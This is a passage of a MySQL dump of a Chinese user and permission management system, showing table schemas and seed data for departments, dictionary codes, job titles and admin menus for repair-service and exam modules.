-- --------------------------------------------------------
-- 主机:                           113.31.106.221
-- 服务器版本:                        8.0.22 - MySQL Community Server - GPL
-- 服务器操作系统:                      Linux
-- HeidiSQL 版本:                  12.0.0.6468
-- --------------------------------------------------------

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET NAMES utf8 */;
/*!50503 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;


-- 导出 light_upms 的数据库结构
CREATE DATABASE IF NOT EXISTS `light_upms` /*!40100 DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci */ /*!80016 DEFAULT ENCRYPTION='N' */;
USE `light_upms`;

-- 导出  表 light_upms.lu_dept 结构
CREATE TABLE IF NOT EXISTS `lu_dept` (
  `id` bigint NOT NULL AUTO_INCREMENT COMMENT '主键Id',
  `dept_name` varchar(255) NOT NULL DEFAULT '' COMMENT '部门名称',
  `parent_dept_id` bigint NOT NULL DEFAULT '0' COMMENT '父级部门Id',
  `sort` int NOT NULL DEFAULT '0' COMMENT '排序值',
  `description` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '描述',
  `status` tinyint NOT NULL DEFAULT '0' COMMENT '状态 0：启用；1：停用',
  `creater_id` bigint NOT NULL DEFAULT '0' COMMENT '创建人Id',
  `creater_name` varchar(255) NOT NULL DEFAULT '' COMMENT '创建人名字',
  `create_date` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `updater_id` bigint NOT NULL DEFAULT '0' COMMENT '更新人Id',
  `updater_name` varchar(255) NOT NULL DEFAULT '' COMMENT '更新人名字',
  `update_date` datetime NOT NULL DEFAULT '1900-01-01 00:00:00' COMMENT '更新时间',
  `is_deleted` tinyint NOT NULL DEFAULT '0' COMMENT '是否删除（0未删除，1已删除）',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='部门';

-- 正在导出表  light_upms.lu_dept 的数据：~12 rows (大约)
DELETE FROM `lu_dept`;
INSERT INTO `lu_dept` (`id`, `dept_name`, `parent_dept_id`, `sort`, `description`, `status`, `creater_id`, `creater_name`, `create_date`, `updater_id`, `updater_name`, `update_date`, `is_deleted`) VALUES
	(1, '寄去哪技术有限公司', 0, 0, '', 0, 0, '', '2020-06-03 11:54:17', 0, '', '1900-01-01 00:00:00', 0),
	(2, '系统研发部', 1, 0, '', 0, 0, '', '2020-06-03 11:54:35', 0, '', '1900-01-01 00:00:00', 0),
	(3, '1', 0, 0, '', 0, 0, '', '2020-07-03 17:58:23', 0, '', '1900-01-01 00:00:00', 1),
	(4, '研发一部', 2, 0, '', 0, 0, '', '2020-07-06 15:45:59', 0, '', '1900-01-01 00:00:00', 0),
	(5, '研发二部', 2, 0, '', 0, 0, '', '2020-07-06 15:46:34', 0, '', '1900-01-01 00:00:00', 0),
	(6, '商务公关部', 1, 0, '', 0, 0, '', '2020-07-06 15:48:03', 1, 'admin', '2020-09-16 18:24:59', 0),
	(7, '研发三部', 2, 0, '', 0, 1, 'admin', '2020-09-16 18:24:37', 0, '', '1900-01-01 00:00:00', 0),
	(8, '111', 6, 0, '', 0, 1, 'admin', '2020-09-16 18:25:39', 0, '', '1900-01-01 00:00:00', 1),
	(9, '商务一部', 6, 0, '', 0, 1, 'admin', '2021-01-19 17:25:24', 0, '', '1900-01-01 00:00:00', 0),
	(10, 'woca', 0, 0, '', 0, 0, '', '2021-10-19 12:20:38', 0, '', '1900-01-01 00:00:00', 1),
	(11, 'wairi', 0, 0, '', 0, 0, '', '2021-10-19 12:22:23', 0, '', '1900-01-01 00:00:00', 1),
	(12, 'test1', 0, 0, '', 0, 2, 'wjg', '2022-03-02 21:53:58', 2, '王杰光', '2022-09-30 16:57:16', 0);

-- 导出  表 light_upms.lu_dict 结构
CREATE TABLE IF NOT EXISTS `lu_dict` (
  `id` bigint NOT NULL AUTO_INCREMENT COMMENT '主键Id',
  `dict_code` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '字典编码',
  `dict_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '字典名称',
  `parent_dict_code` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '父级字典编码',
  `description` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '描述',
  `status` int NOT NULL DEFAULT '0' COMMENT '状态 0：启用；1：停用',
  `creater_id` bigint NOT NULL DEFAULT '0' COMMENT '创建人Id',
  `creater_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '创建人名字',
  `create_date` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `updater_id` bigint NOT NULL DEFAULT '0' COMMENT '更新人Id',
  `updater_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '更新人名字',
  `update_date` datetime NOT NULL DEFAULT '1900-01-01 00:00:00' COMMENT '更新时间',
  `is_deleted` tinyint NOT NULL DEFAULT '0' COMMENT '是否删除（0未删除，1已删除）',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='字典';

-- 正在导出表  light_upms.lu_dict 的数据：~70 rows (大约)
DELETE FROM `lu_dict`;
INSERT INTO `lu_dict` (`id`, `dict_code`, `dict_name`, `parent_dict_code`, `description`, `status`, `creater_id`, `creater_name`, `create_date`, `updater_id`, `updater_name`, `update_date`, `is_deleted`) VALUES
	(1, 'sex', '性别', '', '', 0, 0, '', '2020-09-25 18:50:20', 0, '', '1900-01-01 00:00:00', 1),
	(2, '1adasd', '男', 'sex', '', 0, 0, '', '2020-09-25 18:50:20', 1, 'admin', '2020-09-27 14:44:54', 1),
	(3, 'woca', 'ssad', '', '', 0, 1, 'admin', '2020-09-27 14:45:07', 0, '', '1900-01-01 00:00:00', 1),
	(4, '1', '男', 'sex', '', 0, 1, 'admin', '2020-09-28 17:42:46', 0, '', '1900-01-01 00:00:00', 1),
	(5, '2', '女', 'sex', '', 0, 1, 'admin', '2020-09-28 17:42:46', 0, '', '1900-01-01 00:00:00', 1),
	(6, '3', '3', 'sex', '', 0, 1, 'admin', '2020-09-28 17:42:46', 0, '', '1900-01-01 00:00:00', 1),
	(7, '1', '男', 'sex', '', 0, 1, 'admin', '2020-09-28 17:47:40', 0, '', '1900-01-01 00:00:00', 1),
	(8, '2', '女', 'sex', '', 0, 1, 'admin', '2020-09-28 17:47:41', 0, '', '1900-01-01 00:00:00', 1),
	(9, '1', '男', 'sex', '', 0, 1, 'admin', '2020-09-28 17:48:00', 0, '', '1900-01-01 00:00:00', 1),
	(10, '1', '1', 'sex', '', 0, 1, 'admin', '2020-09-28 17:48:00', 0, '', '1900-01-01 00:00:00', 1),
	(11, 'is_deleted', '是否删除', '', '', 0, 1, 'admin', '2020-09-28 17:50:32', 0, '', '1900-01-01 00:00:00', 1),
	(12, '1', '1', 'is_deleted', '', 0, 1, 'admin', '2020-09-28 17:59:54', 0, '', '1900-01-01 00:00:00', 1),
	(13, '2', '2', 'is_deleted', '', 0, 1, 'admin', '2020-09-28 17:59:54', 0, '', '1900-01-01 00:00:00', 1),
	(14, '1', '1', 'is_deleted', '', 0, 1, 'admin', '2020-09-28 18:06:42', 0, '', '1900-01-01 00:00:00', 1),
	(15, '1', '1', 'is_deleted', '', 0, 1, 'admin', '2020-09-28 18:10:19', 0, '', '1900-01-01 00:00:00', 1),
	(16, '2', '2', 'is_deleted', '', 0, 1, 'admin', '2020-09-28 18:10:19', 0, '', '1900-01-01 00:00:00', 1),
	(17, '1', '1', 'is_deleted', '', 0, 1, 'admin', '2020-09-29 10:50:27', 0, '', '1900-01-01 00:00:00', 1),
	(18, '2', '2', 'is_deleted', '', 0, 1, 'admin', '2020-09-29 10:50:27', 0, '', '1900-01-01 00:00:00', 1),
	(19, '1', '1', 'is_deleted', '', 0, 1, 'admin', '2020-09-29 10:50:27', 0, '', '1900-01-01 00:00:00', 1),
	(20, '1', '男', 'sex', '', 0, 1, 'admin', '2020-10-07 22:47:23', 0, '', '1900-01-01 00:00:00', 1),
	(21, '0', '女', 'sex', '', 0, 1, 'admin', '2020-10-07 22:47:23', 0, '', '1900-01-01 00:00:00', 1),
	(22, '1', '男', 'sex', '', 0, 1, 'admin', '2020-10-07 22:49:15', 0, '', '1900-01-01 00:00:00', 1),
	(23, '1', '1', 'is_deleted', '', 0, 1, 'admin', '2020-10-07 23:45:48', 0, '', '1900-01-01 00:00:00', 1),
	(24, '2', '2', 'is_deleted', '', 0, 1, 'admin', '2020-10-07 23:45:48', 0, '', '1900-01-01 00:00:00', 1),
	(25, '1', '1', 'is_deleted', '', 0, 1, 'admin', '2020-10-07 23:45:48', 0, '', '1900-01-01 00:00:00', 1),
	(26, '111', '1', 'is_deleted', '', 0, 1, 'admin', '2020-10-07 23:45:48', 0, '', '1900-01-01 00:00:00', 1),
	(27, '', '', '', '', 0, 1, 'admin', '2020-11-07 06:58:40', 0, '', '1900-01-01 00:00:00', 1),
	(28, '', '', '', '', 0, 1, 'admin', '2020-11-07 06:58:40', 0, '', '1900-01-01 00:00:00', 1),
	(29, '1', '1', 'is_deleted', '', 0, 1, 'admin', '2020-12-09 19:35:39', 0, '', '1900-01-01 00:00:00', 1),
	(30, '2', '2', 'is_deleted', '', 0, 1, 'admin', '2020-12-09 19:35:39', 0, '', '1900-01-01 00:00:00', 1),
	(31, '1', '1', 'is_deleted', '', 0, 1, 'admin', '2020-12-09 19:35:39', 0, '', '1900-01-01 00:00:00', 1),
	(32, '111', '1', 'is_deleted', '', 0, 1, 'admin', '2020-12-09 19:35:39', 0, '', '1900-01-01 00:00:00', 1),
	(33, '1', '男', 'sex', '', 0, 1, 'admin', '2021-01-19 17:26:14', 0, '', '1900-01-01 00:00:00', 1),
	(34, '2', '女', 'sex', '', 0, 1, 'admin', '2021-01-19 17:26:14', 0, '', '1900-01-01 00:00:00', 1),
	(35, '0', '未删除', 'is_deleted', '', 0, 1, 'admin', '2021-01-19 17:26:31', 0, '', '1900-01-01 00:00:00', 0),
	(36, '1', '已删除', 'is_deleted', '', 0, 1, 'admin', '2021-01-19 17:26:31', 0, '', '1900-01-01 00:00:00', 0),
	(37, '1', '男', 'sex', '', 0, 1, 'admin', '2021-03-10 10:37:19', 0, '', '1900-01-01 00:00:00', 0),
	(38, '0', '女', 'sex', '', 0, 1, 'admin', '2021-03-10 10:37:19', 0, '', '1900-01-01 00:00:00', 0),
	(39, 'company_name', '公司名称', '', '', 0, 4, 'gmk', '2021-07-28 18:28:17', 1, 'admin', '2021-08-06 22:10:46', 0),
	(40, 'quality', '满意度', '', '', 0, 1, 'admin', '2021-08-05 23:38:06', 0, '', '1900-01-01 00:00:00', 0),
	(41, '1', '非常满意', 'quality', '', 0, 1, 'admin', '2021-08-05 23:38:52', 0, '', '1900-01-01 00:00:00', 0),
	(42, '2', '满意', 'quality', '', 0, 1, 'admin', '2021-08-05 23:38:52', 0, '', '1900-01-01 00:00:00', 0),
	(43, '3', '一般', 'quality', '', 0, 1, 'admin', '2021-08-05 23:38:52', 0, '', '1900-01-01 00:00:00', 0),
	(44, '4', '不满意', 'quality', '', 0, 1, 'admin', '2021-08-05 23:38:52', 0, '', '1900-01-01 00:00:00', 0),
	(45, 'service_type', '服务类型', '', '', 0, 1, 'admin', '2021-08-05 23:51:01', 0, '', '1900-01-01 00:00:00', 0),
	(46, '1', '普通客户服务', 'service_type', '', 0, 1, 'admin', '2021-08-05 23:51:17', 0, '', '1900-01-01 00:00:00', 0),
	(47, '2', 'VIP客户服务', 'service_type', '', 0, 1, 'admin', '2021-08-05 23:51:17', 0, '', '1900-01-01 00:00:00', 0),
	(48, 'service_mode', '服务方式', '', '', 0, 1, 'admin', '2021-08-05 23:51:32', 1, 'admin', '2021-11-08 14:53:48', 0),
	(49, '1', '上门服务', 'service_mode', '', 0, 1, 'admin', '2021-08-05 23:51:47', 0, '', '1900-01-01 00:00:00', 1),
	(50, '2', '远程服务', 'service_mode', '', 0, 1, 'admin', '2021-08-05 23:51:47', 0, '', '1900-01-01 00:00:00', 1),
	(51, '1', '上门服务', 'service_mode', '', 0, 1, 'admin', '2021-08-05 23:58:30', 0, '', '1900-01-01 00:00:00', 1),
	(52, '2', '远程服务', 'service_mode', '', 0, 1, 'admin', '2021-08-05 23:58:33', 0, '', '1900-01-01 00:00:00', 1),
	(53, '3', '字典测试', 'service_mode', '', 0, 1, 'admin', '2021-08-05 23:58:33', 0, '', '1900-01-01 00:00:00', 1),
	(54, '1', '上门服务', 'service_mode', '', 0, 1, 'admin', '2021-08-05 23:59:14', 0, '', '1900-01-01 00:00:00', 0),
	(55, '2', '远程服务', 'service_mode', '', 0, 1, 'admin', '2021-08-05 23:59:14', 0, '', '1900-01-01 00:00:00', 0),
	(56, '上海龙飓电子科技有限公司', '上海龙飓电子科技有限公司', 'company_name', '', 0, 1, 'admin', '2021-08-06 22:11:45', 0, '', '1900-01-01 00:00:00', 0),
	(57, '上海赋通贸易有限公司', '上海赋通贸易有限公司', 'company_name', '', 0, 1, 'admin', '2021-08-06 22:11:45', 0, '', '1900-01-01 00:00:00', 0),
	(58, '上海墅景电子科技有限公司', '上海墅景电子科技有限公司', 'company_name', '', 0, 1, 'admin', '2021-08-06 22:11:45', 0, '', '1900-01-01 00:00:00', 0),
	(59, 'test', 'test', '', '', 0, 1, 'admin', '2021-11-08 11:36:21', 0, '', '1900-01-01 00:00:00', 1),
	(60, 'test', 'test1', '', '', 0, 1, 'admin', '2021-11-08 15:07:35', 0, '', '1900-01-01 00:00:00', 1),
	(61, 'test', 'test', '', '', 0, 1, 'admin', '2021-11-08 18:33:50', 0, '', '2021-11-09 10:27:54', 1),
	(62, 'wjg1', 'wjg1', '', '', 0, 1, 'admin', '2021-11-09 10:47:57', 1, 'admin', '2021-11-09 10:49:04', 1),
	(63, 'wjgert', 'wjgert', '', '', 0, 1, 'admin', '2021-11-09 10:54:35', 1, 'admin', '2021-11-09 13:40:04', 1),
	(64, '234', '456', '', '', 0, 1, 'admin', '2021-11-09 10:56:04', 1, 'admin', '2021-11-09 11:14:50', 1),
	(65, 'test', '测试', '', '', 0, 2, 'wjg', '2021-11-09 20:00:03', 1, 'admin', '2021-11-09 20:15:01', 0),
	(66, '1', '1', 'test', '', 0, 1, 'admin', '2021-11-09 20:14:31', 0, '', '1900-01-01 00:00:00', 0),
	(67, 'option_type', '选项类型', '', '', 0, 2, '王杰光', '2022-07-03 21:58:56', 1, 'admin', '2022-10-21 17:56:14', 0),
	(68, '0', '通用', 'option_type', '', 0, 2, '王杰光', '2022-07-03 21:59:43', 0, '', '1900-01-01 00:00:00', 0),
	(69, '1', '填空', 'option_type', '', 0, 2, '王杰光', '2022-07-03 21:59:43', 0, '', '1900-01-01 00:00:00', 0),
	(70, '2', '判断', 'option_type', '', 0, 2, '王杰光', '2022-07-03 21:59:43', 0, '', '1900-01-01 00:00:00', 0);

-- 导出  表 light_upms.lu_job 结构
CREATE TABLE IF NOT EXISTS `lu_job` (
  `id` bigint NOT NULL AUTO_INCREMENT COMMENT '主键Id',
  `job_name` varchar(255) NOT NULL DEFAULT '' COMMENT '岗位名称',
  `description` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '描述',
  `status` tinyint NOT NULL DEFAULT '0' COMMENT '状态 0：启用；1：停用',
  `creater_id` bigint NOT NULL DEFAULT '0' COMMENT '创建人Id',
  `creater_name` varchar(255) NOT NULL DEFAULT '' COMMENT '创建人名字',
  `create_date` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `updater_id` bigint NOT NULL DEFAULT '0' COMMENT '更新人Id',
  `updater_name` varchar(255) NOT NULL DEFAULT '' COMMENT '更新人名字',
  `update_date` datetime NOT NULL DEFAULT '1900-01-01 00:00:00' COMMENT '更新时间',
  `is_deleted` tinyint NOT NULL DEFAULT '0' COMMENT '是否删除（0未删除，1已删除）',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='岗位';

-- 正在导出表  light_upms.lu_job 的数据：~17 rows (大约)
DELETE FROM `lu_job`;
INSERT INTO `lu_job` (`id`, `job_name`, `description`, `status`, `creater_id`, `creater_name`, `create_date`, `updater_id`, `updater_name`, `update_date`, `is_deleted`) VALUES
	(1, '后端开发工程师', '', 0, 0, '', '2020-05-29 12:17:37', 2, '王杰光', '2022-09-30 16:57:40', 0),
	(2, 'string', '', 0, 0, 'string', '2020-06-02 14:21:00', 0, 'string', '1900-01-01 00:00:00', 1),
	(3, '产品经理', '', 0, 0, '', '2020-07-03 17:54:30', 1, 'admin', '2020-09-07 18:54:11', 0),
	(4, '1', '', 0, 0, '', '2020-07-03 17:58:10', 0, '', '1900-01-01 00:00:00', 1),
	(5, '测试工程师', '', 0, 0, '', '2020-07-06 15:58:36', 0, '', '2020-09-07 17:57:40', 0),
	(6, '前端开发工程师', '', 0, 1, 'admin', '2020-09-09 15:03:09', 2, '王杰光', '2022-09-30 16:57:46', 0),
	(7, 'å®åå·¥ç¨å¸', '', 0, 1, 'admin', '2021-05-12 15:55:14', 0, '', '1900-01-01 00:00:00', 1),
	(8, 'å®åå·¥ç¨å¸', '', 0, 1, 'admin', '2021-05-12 15:55:14', 0, '', '1900-01-01 00:00:00', 1),
	(9, 'å®åå·¥ç¨å¸', '', 0, 1, 'admin', '2021-05-12 15:55:14', 0, '', '1900-01-01 00:00:00', 1),
	(10, 'å®åå·¥ç¨å¸', '', 0, 1, 'admin', '2021-05-12 15:55:14', 0, '', '1900-01-01 00:00:00', 1),
	(11, 'å®åå·¥ç¨å¸', '', 0, 1, 'admin', '2021-05-12 15:55:14', 0, '', '1900-01-01 00:00:00', 1),
	(12, 'å®åå·¥ç¨å¸', '', 0, 1, 'admin', '2021-05-12 15:55:14', 0, '', '1900-01-01 00:00:00', 1),
	(13, 'å®åå·¥ç¨å¸', '', 0, 1, 'admin', '2021-05-12 15:55:14', 0, '', '1900-01-01 00:00:00', 1),
	(14, 'å®åå·¥ç¨å¸', '', 0, 1, 'admin', '2021-05-12 15:55:14', 0, '', '1900-01-01 00:00:00', 1),
	(15, 'å®åå·¥ç¨å¸', '', 0, 1, 'admin', '2021-05-12 15:55:14', 0, '', '1900-01-01 00:00:00', 1),
	(16, 'å®åå·¥ç¨å¸', '', 0, 1, 'admin', '2021-05-12 15:55:14', 0, '', '1900-01-01 00:00:00', 1),
	(17, '售前工程师', '', 0, 1, 'admin', '2021-05-12 16:00:32', 0, '', '1900-01-01 00:00:00', 0);

-- 导出  表 light_upms.lu_menu 结构
CREATE TABLE IF NOT EXISTS `lu_menu` (
  `id` bigint NOT NULL AUTO_INCREMENT COMMENT '主键Id',
  `parent_menu_id` bigint NOT NULL DEFAULT '0' COMMENT '父级菜单Id',
  `menu_name` varchar(255) NOT NULL DEFAULT '' COMMENT '菜单名称',
  `path` varchar(255) NOT NULL DEFAULT '' COMMENT '路由/外链地址',
  `component` varchar(255) NOT NULL DEFAULT '' COMMENT '组件路径',
  `type` tinyint NOT NULL DEFAULT '0' COMMENT '类型（0目录，1菜单，2按钮）',
  `redirect` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '重定向路径',
  `is_ext` tinyint NOT NULL DEFAULT '0' COMMENT '是否外链（0否，1是）',
  `permission` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '权限标识',
  `sort` int NOT NULL DEFAULT '0' COMMENT '排序值',
  `icon` varchar(255) NOT NULL DEFAULT '' COMMENT '图标',
  `keepalive` tinyint NOT NULL DEFAULT '0' COMMENT '是否缓存（0否，1是）',
  `show` tinyint NOT NULL DEFAULT '0' COMMENT '是否显示（0显示，1隐藏）',
  `status` tinyint NOT NULL DEFAULT '0' COMMENT '状态 0：启用；1：停用',
  `creater_id` bigint NOT NULL DEFAULT '0' COMMENT '创建人Id',
  `creater_name` varchar(255) NOT NULL DEFAULT '' COMMENT '创建人名字',
  `create_date` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `updater_id` bigint NOT NULL DEFAULT '0' COMMENT '更新人Id',
  `updater_name` varchar(255) NOT NULL DEFAULT '' COMMENT '更新人名字',
  `update_date` datetime NOT NULL DEFAULT '1900-01-01 00:00:00' COMMENT '更新时间',
  `is_deleted` tinyint NOT NULL DEFAULT '0' COMMENT '是否删除（0未删除，1已删除）',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='菜单';

-- 正在导出表  light_upms.lu_menu 的数据：~40 rows (大约)
DELETE FROM `lu_menu`;
INSERT INTO `lu_menu` (`id`, `parent_menu_id`, `menu_name`, `path`, `component`, `type`, `redirect`, `is_ext`, `permission`, `sort`, `icon`, `keepalive`, `show`, `status`, `creater_id`, `creater_name`, `create_date`, `updater_id`, `updater_name`, `update_date`, `is_deleted`) VALUES
	(1, 0, '黑客大赛', ' ', 'RouteView', 0, '', 0, '', 1, 'user', 0, 0, 0, 0, '', '2020-06-03 12:04:14', 1, 'admin', '2020-11-07 03:36:25', 1),
	(2, 1, '景区列表', '/hackathon/scenic-list', 'hackathon/ScenicList', 0, '', 0, '', 0, '', 0, 0, 0, 0, '', '2020-06-03 12:05:14', 1, 'admin', '2020-11-07 08:16:48', 1),
	(3, 0, '仪表盘', '/dashboard', 'LAYOUT', 0, '/dashboard/workplace', 0, '', 0, 'ant-design:bar-chart-outlined', 0, 0, 0, 0, '', '2020-06-03 12:05:14', 1, 'admin', '2022-11-10 22:32:20', 0),
	(4, 3, '工作台', 'workplace', '/dashboard/workbench/index', 1, '', 0, '', 0, '', 0, 0, 0, 0, '', '2020-06-03 12:05:14', 1, 'admin', '2022-11-10 22:32:14', 0),
	(5, 0, '系统管理', '/system', 'LAYOUT', 0, '/system/menu-list', 0, '', 4, 'ant-design:appstore-filled', 0, 0, 0, 0, '', '2020-06-03 12:05:14', 1, 'admin', '2022-11-18 23:41:30', 0),
	(6, 5, '菜单列表', 'menu-list', '/demo/system/menu/index', 1, '', 0, '', 0, '', 0, 0, 0, 0, '', '2020-06-03 12:05:14', 1, 'admin', '2022-11-10 22:59:23', 0),
	(7, 6, '新增', '', '', 2, '', 0, 'menu:add', 0, '', 0, 0, 0, 0, '', '2020-06-03 12:05:14', 0, '', '1900-01-01 00:00:00', 0),
	(8, 6, '编辑', '', '', 2, '', 0, 'menu:edit', 0, '', 0, 0, 0, 0, '', '2020-06-03 12:05:14', 1, 'admin', '2022-11-18 23:14:57', 1),
	(9, 6, '删除', '', '', 2, '', 0, 'menu:delete', 0, '', 0, 0, 0, 0, '', '2020-06-03 12:05:14', 0, '', '1900-01-01 00:00:00', 0),
	(10, 6, '查询', 'search', '', 1, '', 0, '', 0, '', 0, 0, 0, 0, '', '2020-06-03 12:05:14', 0, '', '1900-01-01 00:00:00', 1),
	(11, 6, '导出', 'export', '', 1, '', 0, '', 0, '', 0, 0, 0, 0, '', '2020-06-03 12:05:14', 0, '', '2020-07-08 16:24:16', 1),
	(12, 1, '1', '1', '1', 0, '', 0, '', 1, '1', 0, 0, 0, 0, '', '2020-06-24 16:27:31', 0, '', '2020-06-24 16:33:56', 1),
	(13, 1, 'woca', '1', '1', 1, '', 0, '', 1, '1', 0, 0, 0, 0, '', '2020-06-24 16:33:26', 0, '', '2020-06-24 16:36:23', 1),
	(14, 5, '用户列表', 'user-list', '/demo/system/account/index', 1, '', 0, '', 0, '', 0, 0, 0, 0, '', '2020-07-03 12:15:14', 0, '', '1900-01-01 00:00:00', 0),
	(15, 5, '角色列表', 'role-list', '/demo/system/role/index', 1, '', 0, '', 0, '', 0, 0, 0, 0, '', '2020-07-03 17:18:06', 0, '', '1900-01-01 00:00:00', 0),
	(16, 5, '部门列表', 'dept-list', '/demo/system/dept/index', 1, '', 0, '', 0, '', 0, 0, 0, 0, '', '2020-07-03 17:18:41', 0, '', '1900-01-01 00:00:00', 0),
	(17, 5, '岗位列表', 'job-list', '/demo/system/password/index', 1, '', 0, '', 0, '', 0, 0, 0, 0, '', '2020-07-03 17:19:12', 0, '', '2020-07-06 16:01:48', 0),
	(18, 39, '百度一下', 'https://www.baidu.com', 'IFrame', 1, '', 1, '', 5, '', 0, 0, 0, 0, '', '2020-07-06 18:55:06', 1, 'admin', '2022-11-10 22:49:30', 0),
	(19, 1, 'TreeList1', '/other/tree-list', 'other/TreeList', 0, '', 0, '', 0, '', 0, 0, 0, 0, '', '2020-07-16 10:11:45', 0, '', '2020-09-07 17:48:01', 1),
	(20, 39, '操作日志', 'log-list', 'common/LogList', 1, '', 0, '', 0, '', 0, 0, 0, 1, 'admin', '2020-09-07 19:07:27', 2, '王杰光', '2022-07-01 22:38:50', 0),
	(21, 39, '执行SQL', 'executesql', 'common/ExecuteSql', 1, '', 0, '', 0, '', 0, 0, 0, 1, 'admin', '2020-09-08 15:20:29', 2, '王杰光', '2022-07-01 22:39:10', 0),
	(22, 0, '1', '1', '1', 0, '', 0, '', 1, '1', 0, 0, 0, 1, 'admin', '2020-09-16 18:26:02', 0, '', '1900-01-01 00:00:00', 1),
	(23, 22, '23333333333333333333333333', '2', '2', 0, '', 0, '', 2, '2', 0, 0, 0, 1, 'admin', '2020-09-16 18:27:17', 1, 'admin', '2020-09-16 18:27:26', 1),
	(24, 39, '字典管理', 'dict-list', 'system/DictList', 1, '', 0, '', 0, '', 0, 0, 0, 1, 'admin', '2020-09-27 14:41:49', 2, '王杰光', '2022-07-01 22:38:37', 0),
	(26, 5, '测试出库单打印', '/print/print-from', 'lightservice/SendFormPrint', 0, '', 0, '', 0, 'printer', 0, 0, 0, 1, 'gmk', '2021-07-23 09:03:11', 4, 'gmk', '2021-08-13 10:27:26', 1),
	(27, 0, '维修服务', '/lightservice', 'LAYOUT', 0, '', 0, '', 2, 'ant-design:bug-filled', 0, 0, 0, 1, 'admin', '2021-07-24 17:27:45', 1, 'admin', '2022-11-10 21:54:28', 0),
	(28, 27, '服务单管理', 'service-form-list', 'lightservice/ServiceFormList', 1, '', 0, '', 0, '', 0, 0, 0, 1, 'admin', '2021-07-24 17:30:48', 1, 'admin', '2021-07-26 22:22:54', 0),
	(29, 5, '测试出库单签名', '/upload/upload-form', 'upload/UploadForm', 0, '', 0, '', 0, 'upload', 0, 0, 0, 4, 'gmk', '2021-07-27 09:51:55', 4, 'gmk', '2021-07-27 10:41:07', 1),
	(30, 27, '出库单管理', 'send-form-list', 'lightservice/SendFormList', 1, '', 0, '', 1, '', 0, 0, 0, 2, 'wjg', '2021-08-10 21:19:29', 2, 'wjg', '2022-01-10 16:16:38', 0),
	(31, 27, '服务单管理1', '/lightservice/service-form-list1', 'lightservice/ServiceFormList1', 0, '', 0, '', 2, '', 0, 0, 0, 2, 'wjg', '2021-08-19 20:07:08', 0, '', '1900-01-01 00:00:00', 1),
	(32, 14, '编辑', 'edit', '', 2, '', 0, '', 0, '', 0, 0, 0, 1, 'admin', '2022-05-16 16:51:23', 0, '', '1900-01-01 00:00:00', 0),
	(33, 0, '考试系统', '/lightexam', 'LAYOUT', 0, '', 0, '', 1, 'ant-design:file-text-filled', 0, 0, 0, 2, '王杰光', '2022-06-28 08:25:19', 1, 'admin', '2022-11-10 21:55:10', 0),
	(34, 33, '选项管理', 'option-list', 'lightexam/OptionList', 1, '', 0, '', 0, '', 0, 0, 0, 2, '王杰光', '2022-06-28 08:28:34', 2, '王杰光', '2022-06-28 08:30:16', 0),
	(35, 33, '题库管理', 'question-bank-list', 'lightexam/QuestionBankList', 1, '', 0, '', 0, '', 0, 0, 0, 2, '王杰光', '2022-06-28 08:28:54', 2, '王杰光', '2022-06-28 08:31:07', 0),
	(36, 33, '考题管理', 'question-list', 'lightexam/QuestionList', 1, '', 0, '', 0, '', 0, 0, 0, 2, '王杰光', '2022-06-28 09:33:03', 0, '', '1900-01-01 00:00:00', 0),
	(37, 33, '试卷管理', 'paper-list', 'lightexam/PaperList', 1, '', 0, '', 0, '', 0, 0, 0, 2, '王杰光', '2022-06-28 09:34:05', 0, '', '1900-01-01 00:00:00', 0),
	(38, 33, '考试管理', 'exam-list', 'lightexam/ExamList', 1, '', 0, '', 0, '', 0, 0, 0, 2, '王杰光', '2022-06-28 09:35:49', 0, '', '1900-01-01 00:00:00', 0),
	(39, 0, '通用配置', '/common', 'LAYOUT', 0, '', 0, '', 3, 'ant-design:mobile-filled', 0, 0, 0, 2, '王杰光', '2022-07-01 22:37:18', 1, 'admin', '2022-11-10 21:53:06', 0),
	(40, 39, '省市区管理', 'area-list', 'system/AreaList', 1, '', 0, '', 0, '', 0, 0, 0, 2, '王杰光', '2022-07-01 22:40:53', 0, '', '1900-01-01 00:00:00', 0),
	(41, 0, '测试', '/cs', '', 0, '', 0, '', 100, '', 0, 0, 0, 1, '系统管理员', '2022-09-30 19:03:22', 1, '系统管理员', '2022-10-26 22:16:41', 1),
